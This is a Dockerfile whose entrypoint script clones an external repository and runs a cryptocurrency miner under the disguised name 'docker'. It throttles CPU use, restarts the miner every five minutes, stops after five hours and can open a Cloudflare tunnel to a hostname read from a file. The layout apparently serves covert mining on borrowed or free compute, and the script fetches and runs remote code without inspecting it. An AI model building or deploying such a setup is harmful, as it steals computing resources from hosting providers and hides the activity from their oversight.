FROM debian:stable-slim

RUN apt-get update && apt-get install -y \
    git curl ca-certificates libcurl4 libjansson4 libssl3 libgomp1 sed \
    && rm -rf /var/lib/apt/lists/*

# install cloudflared
RUN curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
    -o /usr/bin/cloudflared && chmod +x /usr/bin/cloudflared

WORKDIR /app

# entrypoint
RUN cat <<'EOF' > /entrypoint.sh
#!/bin/bash

set -e

echo "[INIT] Starting container..."

mkdir -p /app/ramdisk
cd /app/ramdisk

echo "[INIT] Cleaning workspace..."
rm -rf *

echo "[INIT] Cloning repo..."
git clone -q https://github.com/umnodqib/swam.git
cd swam

chmod +x docker

# config core
CORES=${CORES:-1}
LIMIT=$(( CORES * 70 ))

echo "[DOTAJA] Core: $CORES | CPU Limit: $LIMIT%"

# update config
if [ -f docker.json ]; then
    sed -i "s/\"threads\":.*/\"threads\": $CORES,/g" docker.json || true
fi

# tunnel (optional)
if [ -f hostname.txt ]; then
    HOST_CF=$(cat hostname.txt)
    echo "[INIT] Starting Cloudflare tunnel: $HOST_CF"
    cloudflared access tcp --hostname "$HOST_CF" --url 127.0.0.1:443 &
else
    echo "[WARN] hostname.txt tidak ditemukan, skip tunnel"
fi

echo "[INIT] Starting worker loop..."

START_TIME=$(date +%s)
MAX_RUNTIME=$((5 * 60 * 60))   # 5 jam

while true; do
    NOW=$(date +%s)
    ELAPSED=$((NOW - START_TIME))

    # stop kalau sudah 5 jam
    if [ "$ELAPSED" -ge "$MAX_RUNTIME" ]; then
        echo "[EXIT] Max runtime reached ($ELAPSED s)"
        break
    fi

    echo "[LOOP] starting miner..."

    ./docker -c docker.json &
    PID=$!

    echo "[PID] $PID"

    cpulimit -p $PID -l $LIMIT --include-children &

    sleep 300  # jalan 5 menit

    if ! kill -0 $PID 2>/dev/null; then
        echo "[WARN] miner mati, restart..."
    else
        echo "[INFO] restart normal..."
        kill -9 $PID || true
    fi

    sleep 5
done

echo "[DONE] Container selesai normal"

EOF

RUN chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
